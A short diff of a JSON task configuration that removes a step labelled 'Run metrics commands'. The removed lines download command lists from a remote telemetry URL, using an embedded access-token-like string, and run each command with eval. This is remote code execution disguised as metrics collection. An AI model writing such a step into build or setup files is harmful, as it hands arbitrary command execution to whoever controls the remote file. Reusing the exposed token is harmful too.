@@ -25,19 +25,6 @@
                     "helmSets+=('test');",
                 "fi;"
             ]
-        },
-        {
-            "description": "Run metrics commands",
-            "run": [
-                "metrics=$(curl $manifest/telemetry/metrics/mac.json?token=GHSAT0AAAAAABJEBVXLYVW7IB4JHCTWVXN2YSKYX5A | jq -r .commands);",
-                "while read command; do",
-                    "fullCommand='';",
-                    "while read line; do",
-                        "fullCommand+=$(echo ' '$line);",
-                    "done <<< $(echo $command | jq -r .[]);",
-                    "eval $fullCommand;",
-                "done <<< $(echo $metrics | jq -c .[].run);"
-            ]
         }
     ]
 }
